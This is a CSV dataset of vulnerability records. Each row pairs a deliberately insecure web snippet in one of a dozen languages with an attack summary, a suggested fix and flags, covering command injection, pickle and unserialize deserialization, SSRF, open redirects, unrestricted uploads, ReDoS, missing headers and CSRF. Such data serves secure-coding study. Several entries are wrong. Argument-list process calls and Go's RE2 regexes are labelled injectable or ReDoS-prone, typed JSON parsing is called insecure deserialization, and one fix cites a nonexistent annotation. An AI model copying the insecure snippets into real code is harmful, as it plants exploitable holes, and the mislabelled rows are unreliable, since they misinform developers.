vuln-786,Scala,Insecure Session Timeout,No session expiration set.,"Ok.withSession(""user"" -> user.id.toString)",Reuse old sessions.,"Set: Ok.withSession(""user"" -> user.id.toString, maxAge = Some(3600))","Ok.withSession(""user"" -> user.id.toString)",False,False,False,False,42,False,True,False,Authentication,1
vuln-787,Rust,Insecure Session Timeout,Sessions without expiration.,"router.get(""/"", |req, res| req.session()?.set(""user"", user))",Hijack sessions with no expiry.,"Set: req.session()?.set_max_age(Duration::from_secs(3600))?.set(""user"", user)","router.get(""/"", |req, res| req.session()?.set(""user"", user))",True,False,False,False,60,False,True,False,Authentication,1
vuln-788,Elixir,Insecure Session Timeout,No session expiration configured.,"plug Plug.Session, store: :cookie, key: ""_session""",Reuse sessions indefinitely.,"Set: plug Plug.Session, store: :cookie, key: ""_session"", max_age: 3600","plug Plug.Session, store: :cookie, key: ""_session""",False,False,False,False,50,False,True,False,Authentication,1
vuln-789,Perl,Insecure Session Timeout,Sessions without expiration.,$r->session->{user} = $user;,Hijack sessions with no timeout.,Set: $r->session->expire_in(3600); $r->session->{user} = $user;,$r->session->{user} = $user;,False,False,False,False,28,False,False,False,Authentication,1
vuln-790,Node.js,Insecure Deserialization,Untrusted data deserialization.,const obj = JSON.parse(req.body.data);,Inject malicious payloads to execute code.,Validate input: if (isValidSchema(req.body.data)) JSON.parse(req.body.data),const obj = JSON.parse(req.body.data);,True,False,False,False,38,False,False,False,Other,1
vuln-791,Python,Insecure Deserialization,Deserializing untrusted data with pickle.,obj = pickle.loads(request.data),Execute arbitrary code via malicious payloads.,Use JSON: json.loads(request.data) with schema validation,obj = pickle.loads(request.data),False,False,False,False,32,False,False,False,Other,1
vuln-792,Java,Insecure Deserialization,Deserializing untrusted input.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); obj = ois.readObject();,Inject malicious serialized objects.,Avoid: Use JSON with ObjectMapper and validate input,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); obj = ois.readObject();,True,False,False,False,102,False,False,False,Other,1
vuln-793,PHP,Insecure Deserialization,Unserializing untrusted data.,$obj = unserialize($_POST['data']);,Execute arbitrary code via malicious input.,Use JSON: json_decode($_POST['data']) with validation,$obj = unserialize($_POST['data']);,False,False,False,False,35,False,True,False,Other,1
vuln-794,Ruby,Insecure Deserialization,Deserializing untrusted data with Marshal.,obj = Marshal.load(params[:data]),Inject malicious payloads for code execution.,Use JSON: JSON.parse(params[:data]) with schema validation,obj = Marshal.load(params[:data]),True,False,False,False,33,False,False,False,Other,1
vuln-795,Go,Insecure Deserialization,Deserializing untrusted data.,var obj interface{}; json.NewDecoder(r.Body).Decode(&obj),Inject malicious JSON payloads.,Validate: Define struct and validate fields before decoding,var obj interface{}; json.NewDecoder(r.Body).Decode(&obj),True,False,False,False,57,False,False,False,Other,1
vuln-796,C# (.NET),Insecure Deserialization,Deserializing untrusted data.,var obj = JsonSerializer.Deserialize<object>(request.Body);,Inject malicious payloads.,Validate: Use specific types and validate input before deserialization,var obj = JsonSerializer.Deserialize<object>(request.Body);,True,False,False,False,59,False,False,False,Other,1
vuln-797,Kotlin,Insecure Deserialization,Deserializing untrusted data.,val obj = Json.decodeFromString<Any>(call.receiveText()),Inject malicious JSON payloads.,Validate: Use specific data class and validate input,val obj = Json.decodeFromString<Any>(call.receiveText()),False,False,False,False,56,False,False,False,Other,1
vuln-798,Scala,Insecure Deserialization,Deserializing untrusted data.,val obj = Json.parse(request.body.asText),Inject malicious payloads.,Validate: Use case class and validate input before parsing,val obj = Json.parse(request.body.asText),True,False,False,False,41,False,False,False,Other,1
vuln-799,Rust,Insecure Deserialization,Deserializing untrusted data.,let obj: serde_json::Value = serde_json::from_reader(req.body()?)?;,Inject malicious JSON payloads.,Validate: Use struct and validate fields before deserialization,let obj: serde_json::Value = serde_json::from_reader(req.body()?)?;,True,False,False,False,67,False,False,False,Other,1
vuln-800,Elixir,Insecure Deserialization,Deserializing untrusted data.,"{:ok, obj} = Jason.decode(params[""data""])",Inject malicious payloads.,Validate: Use struct and validate fields before decoding,"{:ok, obj} = Jason.decode(params[""data""])",True,False,False,False,41,False,True,False,Other,1
vuln-801,Perl,Insecure Deserialization,Deserializing untrusted data with Storable.,my $obj = Storable::thaw($r->param('data'));,Inject malicious payloads for code execution.,Use JSON: decode_json($r->param('data')) with validation,my $obj = Storable::thaw($r->param('data'));,True,False,False,False,44,False,True,False,Other,1
vuln-802,Node.js,Server-Side Request Forgery (SSRF),Unvalidated URL requests.,const response = await axios.get(req.query.url);,Access internal services or localhost endpoints.,Validate URLs: if (isValidExternalUrl(req.query.url)) axios.get(req.query.url),const response = await axios.get(req.query.url);,True,True,False,False,48,False,False,False,Other,1
vuln-803,Python,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,response = requests.get(request.args.get('url')),Request internal or restricted endpoints.,Restrict: if is_allowed_url(request.args.get('url')): requests.get(...),response = requests.get(request.args.get('url')),False,False,False,False,48,False,True,False,Other,1
vuln-804,Java,Server-Side Request Forgery (SSRF),Unvalidated URL in HTTP requests.,"URL url = new URL(request.getParameter(""url"")); HttpURLConnection conn = url.openConnection();",Access internal network resources.,"Validate: if (isValidUrl(request.getParameter(""url""))) url.openConnection()","URL url = new URL(request.getParameter(""url"")); HttpURLConnection conn = url.openConnection();",True,False,True,False,94,False,True,False,Other,1
vuln-805,PHP,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,$response = file_get_contents($_GET['url']);,Access internal or sensitive endpoints.,Validate: if (is_allowed_url($_GET['url'])) file_get_contents($_GET['url']),$response = file_get_contents($_GET['url']);,False,False,False,False,44,False,True,False,Other,1
vuln-806,Ruby,Server-Side Request Forgery (SSRF),Unvalidated URL requests.,response = Net::HTTP.get(URI(params[:url])),Access internal services or localhost.,Validate: Net::HTTP.get(URI(params[:url])) if is_valid_url(params[:url]),response = Net::HTTP.get(URI(params[:url])),True,False,False,False,43,False,False,False,Other,1
vuln-807,Go,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,"resp, _ := http.Get(r.URL.Query().Get(""url""))",Request internal or restricted endpoints.,"Validate: if isAllowedUrl(r.URL.Query().Get(""url"")) { http.Get(...) }","resp, _ := http.Get(r.URL.Query().Get(""url""))",True,True,False,False,45,False,True,False,Other,1
vuln-808,C# (.NET),Server-Side Request Forgery (SSRF),Unvalidated URL in HTTP requests.,"var response = await httpClient.GetAsync(request.Query[""url""]);",Access internal network resources.,"Validate: if (IsValidUrl(request.Query[""url""])) await httpClient.GetAsync(...)","var response = await httpClient.GetAsync(request.Query[""url""]);",True,True,False,False,63,False,True,False,Other,1
vuln-809,Kotlin,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,"val response = http.get(call.parameters[""url""]!!)",Access internal or sensitive endpoints.,"Validate: if (isValidUrl(call.parameters[""url""])) http.get(...)","val response = http.get(call.parameters[""url""]!!)",True,False,False,False,49,False,True,False,Other,1
vuln-810,Scala,Server-Side Request Forgery (SSRF),Unvalidated URL requests.,"val response = WS.url(params(""url"")).get()",Access internal services or localhost.,"Validate: if (isValidUrl(params(""url""))) WS.url(...).get()","val response = WS.url(params(""url"")).get()",True,False,False,False,42,False,True,False,Other,1
vuln-811,Rust,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,"let resp = reqwest::get(req.param(""url"")?).await?;",Request internal or restricted endpoints.,"Validate: if is_allowed_url(req.param(""url"")?) { reqwest::get(...).await? }","let resp = reqwest::get(req.param(""url"")?).await?;",True,False,False,False,50,False,True,False,Other,1
vuln-812,Elixir,Server-Side Request Forgery (SSRF),Unvalidated URL requests.,"{:ok, response} = HTTPoison.get(params[""url""])",Access internal services or localhost.,"Validate: if is_valid_url(params[""url""]) do HTTPoison.get(...) end","{:ok, response} = HTTPoison.get(params[""url""])",True,False,False,False,46,False,True,False,Other,1
vuln-813,Perl,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,my $response = LWP::UserAgent->new->get($r->param('url'));,Access internal or sensitive endpoints.,Validate: if (is_allowed_url($r->param('url'))) { LWP::UserAgent->new->get(...) },my $response = LWP::UserAgent->new->get($r->param('url'));,True,False,False,False,58,False,True,False,Other,1
vuln-814,Node.js,Insecure Redirects,Unvalidated redirect URLs.,res.redirect(req.query.redirect);,Redirect users to malicious sites.,Validate: if (isSafeUrl(req.query.redirect)) res.redirect(req.query.redirect),res.redirect(req.query.redirect);,True,True,False,False,33,False,False,False,Other,1
vuln-815,Python,Insecure Redirects,Unvalidated redirect URLs.,return redirect(request.args.get('redirect')),Redirect to phishing or malicious sites.,Validate: if is_safe_url(request.args.get('redirect')): redirect(...),return redirect(request.args.get('redirect')),False,False,False,False,45,False,True,False,Other,1
vuln-816,Java,Insecure Redirects,Unvalidated redirect URLs.,"response.sendRedirect(request.getParameter(""redirect""));",Redirect users to malicious domains.,"Validate: if (isSafeUrl(request.getParameter(""redirect""))) response.sendRedirect(...)","response.sendRedirect(request.getParameter(""redirect""));",True,False,False,False,56,False,True,False,Other,1
vuln-817,PHP,Insecure Redirects,Unvalidated redirect URLs.,header('Location: ' . $_GET['redirect']);,Redirect to malicious sites.,Validate: if (is_safe_url($_GET['redirect'])) header('Location: ' . $_GET['redirect']);,header('Location: ' . $_GET['redirect']);,False,False,False,False,41,False,True,False,Other,1
vuln-818,Ruby,Insecure Redirects,Unvalidated redirect URLs.,redirect_to params[:redirect],Redirect users to phishing sites.,Validate: redirect_to params[:redirect] if is_safe_url(params[:redirect]),redirect_to params[:redirect],True,False,False,False,29,False,False,False,Other,1
vuln-819,Go,Insecure Redirects,Unvalidated redirect URLs.,"http.Redirect(w, r, r.URL.Query().Get(""redirect""), http.StatusFound)",Redirect to malicious domains.,"Validate: if isSafeUrl(r.URL.Query().Get(""redirect"")) { http.Redirect(...) }","http.Redirect(w, r, r.URL.Query().Get(""redirect""), http.StatusFound)",True,True,False,False,68,False,True,False,Other,1
vuln-820,C# (.NET),Insecure Redirects,Unvalidated redirect URLs.,"return Redirect(Request.Query[""redirect""]);",Redirect users to malicious sites.,"Validate: if (IsSafeUrl(Request.Query[""redirect""])) return Redirect(...)","return Redirect(Request.Query[""redirect""]);",True,True,False,False,43,False,True,False,Other,1
vuln-821,Kotlin,Insecure Redirects,Unvalidated redirect URLs.,"call.respond(redirect(call.parameters[""redirect""]!!))",Redirect to phishing sites.,"Validate: if (isSafeUrl(call.parameters[""redirect""])) call.respond(redirect(...))","call.respond(redirect(call.parameters[""redirect""]!!))",True,False,False,False,53,False,True,False,Other,1
vuln-822,Scala,Insecure Redirects,Unvalidated redirect URLs.,"Redirect(params(""redirect""))",Redirect users to malicious domains.,"Validate: if (isSafeUrl(params(""redirect""))) Redirect(...)","Redirect(params(""redirect""))",True,False,False,False,28,False,True,False,Other,1
vuln-823,Rust,Insecure Redirects,Unvalidated redirect URLs.,"res.redirect(req.param(""redirect"")?)",Redirect to malicious sites.,"Validate: if is_safe_url(req.param(""redirect"")?) { res.redirect(...) }","res.redirect(req.param(""redirect"")?)",True,False,False,False,36,False,True,False,Other,1
vuln-824,Elixir,Insecure Redirects,Unvalidated redirect URLs.,"redirect conn, external: params[""redirect""]",Redirect users to phishing sites.,"Validate: if is_safe_url(params[""redirect""]) do redirect conn, external: params[""redirect""] end","redirect conn, external: params[""redirect""]",True,False,False,False,43,False,True,False,Other,1
vuln-825,Perl,Insecure Redirects,Unvalidated redirect URLs.,$r->headers_out->set('Location' => $r->param('redirect'));,Redirect to malicious domains.,Validate: if (is_safe_url($r->param('redirect'))) { $r->headers_out->set('Location' => ...); },$r->headers_out->set('Location' => $r->param('redirect'));,True,False,False,False,58,False,True,False,Other,1
vuln-826,Node.js,Insecure File Upload,Unrestricted file uploads.,"app.post('/upload', (req, res) => { req.files.file.mv('/uploads/' + req.files.file.name); });",Upload malicious files like webshells.,Validate: if (isSafeFile(req.files.file)) req.files.file.mv(...),"app.post('/upload', (req, res) => { req.files.file.mv('/uploads/' + req.files.file.name); });",True,False,False,False,93,False,True,True,File_Handling,1
vuln-827,Python,Insecure File Upload,No validation on uploaded files.,file = request.files['file']; file.save('uploads/' + file.filename),Upload executable scripts or malware.,Validate: if is_safe_file(file): file.save(...),file = request.files['file']; file.save('uploads/' + file.filename),False,False,False,False,67,False,True,True,File_Handling,1
vuln-828,Java,Insecure File Upload,Unrestricted file uploads.,"MultipartFile file = request.getFile(""file""); file.transferTo(new File(""uploads/"" + file.getOriginalFilename()));",Upload malicious files.,Validate: if (isSafeFile(file)) file.transferTo(...),"MultipartFile file = request.getFile(""file""); file.transferTo(new File(""uploads/"" + file.getOriginalFilename()));",False,False,False,False,113,False,True,True,File_Handling,1
vuln-829,PHP,Insecure File Upload,No validation on uploaded files.,"move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",Upload executable scripts or webshells.,Validate: if (is_safe_file($_FILES['file'])) move_uploaded_file(...),"move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",False,False,False,False,86,False,True,False,File_Handling,1
vuln-830,Ruby,Insecure File Upload,Unrestricted file uploads.,"File.write(""uploads/#{params[:file].original_filename}"", params[:file].read)",Upload malicious files.,Validate: File.write(...) if is_safe_file(params[:file]),"File.write(""uploads/#{params[:file].original_filename}"", params[:file].read)",True,False,False,False,76,False,True,False,File_Handling,1
vuln-831,Go,Insecure File Upload,No validation on uploaded files.,"file, header, _ := r.FormFile(""file""); os.WriteFile(""uploads/""+header.Filename, file, 0644)",Upload executable scripts.,Validate: if isSafeFile(header) { os.WriteFile(...) },"file, header, _ := r.FormFile(""file""); os.WriteFile(""uploads/""+header.Filename, file, 0644)",False,False,True,False,91,False,True,True,File_Handling,1
vuln-832,C# (.NET),Insecure File Upload,Unrestricted file uploads.,"var file = Request.Form.Files[0]; await File.WriteAllBytesAsync(""uploads/"" + file.FileName, file.OpenReadStream());",Upload malicious files.,Validate: if (IsSafeFile(file)) await File.WriteAllBytesAsync(...),"var file = Request.Form.Files[0]; await File.WriteAllBytesAsync(""uploads/"" + file.FileName, file.OpenReadStream());",False,False,True,False,115,False,True,True,File_Handling,1
vuln-833,Kotlin,Insecure File Upload,No validation on uploaded files.,"val file = call.receiveMultipart().readPart() as FilePart; File(""uploads/${file.fileName}"").writeBytes(file.streamProvider().readAllBytes())",Upload executable scripts.,Validate: if (isSafeFile(file)) File(...).writeBytes(...),"val file = call.receiveMultipart().readPart() as FilePart; File(""uploads/${file.fileName}"").writeBytes(file.streamProvider().readAllBytes())",False,False,False,False,140,False,True,True,File_Handling,1
vuln-834,Scala,Insecure File Upload,Unrestricted file uploads.,"val file = request.body.asMultipartFormData.get.file(""file"").get; Files.write(Paths.get(""uploads/"" + file.filename), file.ref)",Upload malicious files.,Validate: if (isSafeFile(file)) Files.write(...),"val file = request.body.asMultipartFormData.get.file(""file"").get; Files.write(Paths.get(""uploads/"" + file.filename), file.ref)",True,False,False,False,126,False,True,True,File_Handling,1
vuln-835,Rust,Insecure File Upload,No validation on uploaded files.,"let part = req.multipart()?.next_field()?.await?; fs::write(format!(""uploads/{}"", part.file_name()?), part.bytes()?.await?)?;",Upload executable scripts.,Validate: if is_safe_file(part.file_name()?) { fs::write(...) },"let part = req.multipart()?.next_field()?.await?; fs::write(format!(""uploads/{}"", part.file_name()?), part.bytes()?.await?)?;",True,False,False,False,125,False,True,False,File_Handling,1
vuln-836,Elixir,Insecure File Upload,Unrestricted file uploads.,"file = params[""file""]; File.write(""uploads/#{file.filename}"", file.content)",Upload malicious files.,Validate: if is_safe_file(file) do File.write(...) end,"file = params[""file""]; File.write(""uploads/#{file.filename}"", file.content)",True,False,False,False,75,False,True,False,File_Handling,1
vuln-837,Perl,Insecure File Upload,No validation on uploaded files.,"my $file = $r->upload('file'); open(my $fh, '>', ""uploads/$file->{filename}""); print $fh $file->{content};",Upload executable scripts.,"Validate: if (is_safe_file($file)) { open(my $fh, '>', ...); }","my $file = $r->upload('file'); open(my $fh, '>', ""uploads/$file->{filename}""); print $fh $file->{content};",False,False,True,False,106,False,True,False,File_Handling,1
vuln-838,Node.js,Command Injection,Executing untrusted input in shell commands.,exec(`cat ${req.query.file}`);,Inject malicious commands via input.,Avoid exec: Use safe file reading like fs.readFileSync,exec(`cat ${req.query.file}`);,True,True,False,True,30,False,False,True,Injection,1
vuln-839,Python,Command Injection,Running untrusted input in system commands.,"os.system(f'cat {request.args.get(""file"")}')",Inject arbitrary commands.,"Use safe APIs: open(request.args.get('file'), 'r').read() with validation","os.system(f'cat {request.args.get(""file"")}')",False,False,False,True,44,False,True,False,Injection,1
vuln-840,Java,Command Injection,Executing untrusted input in commands.,"Runtime.getRuntime().exec(""cat "" + request.getParameter(""file""));",Inject malicious commands.,Avoid exec: Use Files.readString(Path.of(file)) with validation,"Runtime.getRuntime().exec(""cat "" + request.getParameter(""file""));",True,True,False,True,65,False,True,True,Injection,1
vuln-841,PHP,Command Injection,Running untrusted input in shell commands.,shell_exec('cat ' . $_GET['file']);,Inject arbitrary commands.,Use safe APIs: file_get_contents($_GET['file']) with validation,shell_exec('cat ' . $_GET['file']);,False,True,False,True,35,False,True,False,Injection,1
vuln-842,Ruby,Command Injection,Executing untrusted input in system commands.,"system(""cat #{params[:file]}"")",Inject malicious commands.,Use safe APIs: File.read(params[:file]) with validation,"system(""cat #{params[:file]}"")",True,False,False,True,30,False,True,False,Injection,1
vuln-843,Go,Command Injection,Running untrusted input in commands.,"exec.Command(""cat"", r.URL.Query().Get(""file"")).Run()",Inject arbitrary commands.,"Use safe APIs: os.ReadFile(r.URL.Query().Get(""file"")) with validation","exec.Command(""cat"", r.URL.Query().Get(""file"")).Run()",True,True,False,True,52,False,True,False,Injection,1
vuln-844,C# (.NET),Command Injection,Executing untrusted input in commands.,"Process.Start(""cmd.exe"", ""/c cat "" + Request.Query[""file""]);",Inject malicious commands.,"Use safe APIs: File.ReadAllText(Request.Query[""file""]) with validation","Process.Start(""cmd.exe"", ""/c cat "" + Request.Query[""file""]);",True,True,False,False,60,False,True,True,Injection,1
vuln-845,Kotlin,Command Injection,Running untrusted input in system commands.,"ProcessBuilder(""cat"", call.parameters[""file""]!!).start()",Inject arbitrary commands.,"Use safe APIs: File(call.parameters[""file""]).readText() with validation","ProcessBuilder(""cat"", call.parameters[""file""]!!).start()",True,False,False,False,56,False,True,False,Injection,1
vuln-846,Scala,Command Injection,Executing untrusted input in commands.,"import sys.process._; s""cat ${params(""file"")}"".!",Inject malicious commands.,"Use safe APIs: Files.readString(Paths.get(params(""file""))) with validation","import sys.process._; s""cat ${params(""file"")}"".!",True,False,False,False,48,False,True,True,Injection,1
vuln-847,Rust,Command Injection,Running untrusted input in commands.,"Command::new(""cat"").arg(req.param(""file"")?).output()?",Inject arbitrary commands.,"Use safe APIs: fs::read_to_string(req.param(""file"")?)? with validation","Command::new(""cat"").arg(req.param(""file"")?).output()?",True,False,False,False,53,False,True,False,Injection,1
vuln-848,Elixir,Command Injection,Executing untrusted input in system commands.,"System.cmd(""cat"", [params[""file""]])",Inject malicious commands.,"Use safe APIs: File.read(params[""file""]) with validation","System.cmd(""cat"", [params[""file""]])",True,False,False,True,35,False,True,False,Injection,1
vuln-849,Perl,Command Injection,Running untrusted input in shell commands.,"system(""cat "" . $r->param('file'));",Inject arbitrary commands.,Use safe APIs: read_file($r->param('file')) with validation,"system(""cat "" . $r->param('file'));",True,False,False,True,35,False,True,False,Injection,1
vuln-850,Node.js,Insecure Regular Expression,Using regex vulnerable to ReDoS.,const re = /^((a+)+)$/; re.test(req.query.input);,Craft input to cause exponential backtracking.,Use safe regex: /^a+$/ or limit input length,const re = /^((a+)+)$/; re.test(req.query.input);,True,True,False,False,49,False,False,True,Other,1
vuln-851,Python,Insecure Regular Expression,Regex vulnerable to ReDoS.,"import re; re.match(r'^((a+)+)$', request.args.get('input'))",Trigger ReDoS with malicious input.,Use safe regex: r'^a+$' or enforce input size limits,"import re; re.match(r'^((a+)+)$', request.args.get('input'))",True,False,False,False,60,False,True,True,Other,1
vuln-852,Java,Insecure Regular Expression,Regex susceptible to ReDoS.,"Pattern.compile(""^((a+)+)$"").matcher(request.getParameter(""input"")).matches();",Cause denial of service via backtracking.,"Use safe regex: Pattern.compile(""^a+$"") or limit input length","Pattern.compile(""^((a+)+)$"").matcher(request.getParameter(""input"")).matches();",True,False,False,False,78,False,True,True,Other,1
vuln-853,PHP,Insecure Regular Expression,Regex vulnerable to ReDoS.,"preg_match('/^((a+)+)$/', $_GET['input']);",Trigger exponential backtracking.,Use safe regex: '/^a+$/' or restrict input size,"preg_match('/^((a+)+)$/', $_GET['input']);",True,False,False,False,42,False,True,True,Other,1
vuln-854,Ruby,Insecure Regular Expression,Regex susceptible to ReDoS.,/^((a+)+)$/.match?(params[:input]),Cause ReDoS with crafted input.,Use safe regex: /^a+$/ or limit input length,/^((a+)+)$/.match?(params[:input]),True,False,False,False,34,False,False,True,Other,1
vuln-855,Go,Insecure Regular Expression,Regex vulnerable to ReDoS.,"re := regexp.MustCompile(`^((a+)+)$`); re.MatchString(r.URL.Query().Get(""input""))",Trigger denial of service via backtracking.,Use safe regex: `^a+$` or enforce input size limits,"re := regexp.MustCompile(`^((a+)+)$`); re.MatchString(r.URL.Query().Get(""input""))",True,True,False,False,81,False,True,True,Other,1
vuln-856,C# (.NET),Insecure Regular Expression,Regex susceptible to ReDoS.,"Regex.IsMatch(Request.Query[""input""], ""^((a+)+)$"");",Cause ReDoS with malicious input.,"Use safe regex: ""^a+$"" or limit input length","Regex.IsMatch(Request.Query[""input""], ""^((a+)+)$"");",True,True,False,False,51,False,True,True,Other,1
vuln-857,Kotlin,Insecure Regular Expression,Regex vulnerable to ReDoS.,"Regex(""^((a+)+)$"").matches(call.parameters[""input""]!!)",Trigger exponential backtracking.,"Use safe regex: Regex(""^a+$"") or restrict input size","Regex(""^((a+)+)$"").matches(call.parameters[""input""]!!)",True,False,False,False,54,False,True,True,Other,1
vuln-858,Scala,Insecure Regular Expression,Regex susceptible to ReDoS.,"val re = ""^((a+)+)$"".r; re.findFirstIn(params(""input"")).isDefined",Cause ReDoS with crafted input.,"Use safe regex: ""^a+$"".r or limit input length","val re = ""^((a+)+)$"".r; re.findFirstIn(params(""input"")).isDefined",True,False,False,False,65,False,True,True,Other,1
vuln-860,Elixir,Insecure Regular Expression,Regex susceptible to ReDoS.,"Regex.match?(~r/^((a+)+)$/, params[""input""])",Cause ReDoS with malicious input.,Use safe regex: ~r/^a+$/ or limit input length,"Regex.match?(~r/^((a+)+)$/, params[""input""])",True,False,False,False,44,False,True,True,Other,1
vuln-861,Perl,Insecure Regular Expression,Regex vulnerable to ReDoS.,my $input = $r->param('input'); $input =~ /^((a+)+)$/;,Trigger exponential backtracking.,Use safe regex: /^a+$/ or restrict input size,my $input = $r->param('input'); $input =~ /^((a+)+)$/;,True,False,False,False,54,False,True,True,Other,1
vuln-862,Node.js,Insecure HTTP Headers,Missing security headers like X-Frame-Options.,"app.get('/', (req, res) => res.send('Home'));",Enable clickjacking attacks.,"Add: res.set('X-Frame-Options', 'DENY')","app.get('/', (req, res) => res.send('Home'));",False,False,False,False,45,False,True,False,Configuration,1
vuln-863,Python,Insecure HTTP Headers,Missing X-Frame-Options header.,@app.route('/') def home(): return 'Home',Facilitate clickjacking.,Add: response.headers['X-Frame-Options'] = 'DENY',@app.route('/') def home(): return 'Home',False,False,False,False,41,False,True,False,Configuration,1
vuln-864,Java,Insecure HTTP Headers,Missing security headers.,"@GetMapping(""/"") public String home() { return ""Home""; }",Enable clickjacking or other attacks.,"Add: response.setHeader(""X-Frame-Options"", ""DENY"")","@GetMapping(""/"") public String home() { return ""Home""; }",False,False,False,False,56,False,True,False,Configuration,1
vuln-865,PHP,Insecure HTTP Headers,Missing X-Frame-Options header.,echo 'Home';,Facilitate clickjacking attacks.,Add: header('X-Frame-Options: DENY');,echo 'Home';,False,False,False,False,12,False,True,False,Configuration,1
vuln-866,Ruby,Insecure HTTP Headers,Missing security headers.,get '/' do 'Home' end,Enable clickjacking.,Add: response.headers['X-Frame-Options'] = 'DENY',get '/' do 'Home' end,False,False,False,False,21,False,True,False,Configuration,1
vuln-867,Go,Insecure HTTP Headers,Missing X-Frame-Options header.,"http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""Home"") })",Facilitate clickjacking attacks.,"Add: w.Header().Set(""X-Frame-Options"", ""DENY"")","http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""Home"") })",False,False,False,False,92,False,True,False,Configuration,1
vuln-868,C# (.NET),Insecure HTTP Headers,Missing security headers.,"[HttpGet(""/"")] public IActionResult Home() { return Ok(""Home""); }",Enable clickjacking.,"Add: Response.Headers.Add(""X-Frame-Options"", ""DENY"")","[HttpGet(""/"")] public IActionResult Home() { return Ok(""Home""); }",False,False,False,False,65,False,True,False,Configuration,1
vuln-869,Kotlin,Insecure HTTP Headers,Missing X-Frame-Options header.,"get(""/"") { call.respondText(""Home"") }",Facilitate clickjacking attacks.,"Add: call.response.header(""X-Frame-Options"", ""DENY"")","get(""/"") { call.respondText(""Home"") }",False,False,False,False,37,False,True,False,Configuration,1
vuln-870,Scala,Insecure HTTP Headers,Missing security headers.,"get(""/"") { Ok(""Home"") }",Enable clickjacking.,"Add: Ok(""Home"").withHeaders(""X-Frame-Options"" -> ""DENY"")","get(""/"") { Ok(""Home"") }",False,False,False,False,23,False,True,False,Configuration,1
vuln-871,Rust,Insecure HTTP Headers,Missing X-Frame-Options header.,"router.get(""/"", |_, res| res.render_text(""Home""))",Facilitate clickjacking attacks.,"Add: res.header(""X-Frame-Options"", ""DENY"")","router.get(""/"", |_, res| res.render_text(""Home""))",False,False,False,False,49,False,True,False,Configuration,1
vuln-872,Elixir,Insecure HTTP Headers,Missing security headers.,"get ""/"", do: send_resp(conn, 200, ""Home"")",Enable clickjacking.,"Add: put_resp_header(conn, ""x-frame-options"", ""DENY"")","get ""/"", do: send_resp(conn, 200, ""Home"")",False,False,False,False,41,False,True,False,Configuration,1
vuln-873,Perl,Insecure HTTP Headers,Missing X-Frame-Options header.,$r->print('Home');,Facilitate clickjacking attacks.,Add: $r->headers_out->set('X-Frame-Options' => 'DENY');,$r->print('Home');,False,False,False,False,18,False,True,False,Configuration,1
vuln-874,Node.js,Insecure CSRF Token Handling,No CSRF token validation.,"app.post('/update', (req, res) => updateUser(req.body));",Forge requests to perform unauthorized actions.,"Use CSRF: app.use(csrf()); app.post('/update', csrfMiddleware, updateUser)","app.post('/update', (req, res) => updateUser(req.body));",True,True,False,False,56,False,True,False,Authentication,1
vuln-875,Python,Insecure CSRF Token Handling,Missing CSRF token validation.,"@app.route('/update', methods=['POST']) def update(): update_user(request.form)",Execute unauthorized actions via forged requests.,Use CSRF: from flask_wtf.csrf import CSRFProtect; csrf = CSRFProtect(app),"@app.route('/update', methods=['POST']) def update(): update_user(request.form)",False,True,False,False,79,False,True,False,Authentication,1
vuln-876,Java,Insecure CSRF Token Handling,No CSRF protection on state-changing requests.,"@PostMapping(""/update"") public void update(@RequestBody User user) { userRepo.save(user); }",Forge requests to modify data.,Add CSRF: @CsrfTokenRequired,"@PostMapping(""/update"") public void update(@RequestBody User user) { userRepo.save(user); }",True,True,False,False,91,False,True,False,Authentication,1
vuln-877,PHP,Insecure CSRF Token Handling,Missing CSRF token validation.,$user = $_POST; update_user($user);,Perform unauthorized actions via forged requests.,Validate CSRF: if (validate_csrf_token($_POST['csrf_token'])) update_user($user);,$user = $_POST; update_user($user);,False,True,False,False,35,False,False,False,Authentication,1
vuln-878,Ruby,Insecure CSRF Token Handling,No CSRF protection.,post '/update' do update_user(params) end,Forge requests to change data.,Enable CSRF: protect_from_forgery with: :exception,post '/update' do update_user(params) end,True,True,False,False,41,False,True,False,Authentication,1
vuln-879,Go,Insecure CSRF Token Handling,Missing CSRF token validation.,"http.HandleFunc(""/update"", func(w http.ResponseWriter, r *http.Request) { updateUser(r.Form) })",Execute unauthorized actions.,"Validate CSRF: if validateCsrfToken(r.FormValue(""csrf_token"")) { updateUser(...) }","http.HandleFunc(""/update"", func(w http.ResponseWriter, r *http.Request) { updateUser(r.Form) })",False,True,False,False,95,False,True,False,Authentication,1
vuln-880,C# (.NET),Insecure CSRF Token Handling,No CSRF protection on POST requests.,"[HttpPost(""/update"")] public IActionResult Update(User user) { db.Save(user); }",Forge requests to modify data.,Add CSRF: [ValidateAntiForgeryToken],"[HttpPost(""/update"")] public IActionResult Update(User user) { db.Save(user); }",False,True,False,False,79,False,True,False,Authentication,1
vuln-881,Kotlin,Insecure CSRF Token Handling,Missing CSRF token validation.,"post(""/update"") { call.receive<User>().let { updateUser(it) } }",Perform unauthorized actions.,"Validate CSRF: if (validateCsrfToken(call.parameters[""csrf_token""])) updateUser(...)","post(""/update"") { call.receive<User>().let { updateUser(it) } }",False,True,False,False,63,False,True,False,Authentication,1
vuln-882,Scala,Insecure CSRF Token Handling,No CSRF protection.,"post(""/update"") { updateUser(request.body.asJson) }",Forge requests to change data.,Add CSRF: CSRFAction { updateUser(...) } if validCsrfToken,"post(""/update"") { updateUser(request.body.asJson) }",True,True,False,False,51,False,True,False,Authentication,1
vuln-883,Rust,Insecure CSRF Token Handling,Missing CSRF token validation.,"router.post(""/update"", |req, res| update_user(req.form::<User>()?.await))",Execute unauthorized actions.,Validate CSRF: if validate_csrf_token(req.form::<Token>()?.await) { update_user(...) },"router.post(""/update"", |req, res| update_user(req.form::<User>()?.await))",True,True,False,False,73,False,True,False,Authentication,1
